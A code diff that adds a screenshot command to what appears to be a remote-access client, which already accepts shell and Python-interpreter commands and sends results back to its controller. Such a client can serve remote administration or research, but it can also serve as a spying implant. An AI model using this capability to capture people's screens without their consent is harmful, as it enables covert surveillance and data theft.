@@ -8,7 +8,7 @@ from io import StringIO
 from cryptography import x509
 
 from utils.baseclient import BaseClient
-
+from modules import screen
 
 logging.basicConfig(level=logging.DEBUG)
 
@@ -28,6 +28,8 @@ class Client(BaseClient):
                 self.shell()
             case 'PYTHON':
                 self.interpreter()
+            case 'SCREENSHOT':
+                self.screenshot()
             case _:
                 logging.debug('Received unrecognized command: %s' % command)
 
@@ -54,8 +56,21 @@ class Client(BaseClient):
             error_message = f'{error.__class__.__name__}: {str(error)}\n'
         finally:
             sys.stdout = old_stdout
-
         self.write((output.getvalue() + error_message).encode())
+
+    def screenshot(self):
+        """ Take a screenshot """
+        logging.debug('Capturing screenshot')
+        try:
+            data = screen.screenshot()
+        except Exception as error:
+            error_message = '%s: %s' % (error.__class__.__name__, str(error))
+            logging.error('Error taking screenshot: ' + error_message)
+            data = ('ERROR: ' + error_message).encode()
+        else:
+            logging.info('Successfully captured screenshot')
+        self.write(data)
+
 
 if __name__ == '__main__':
 
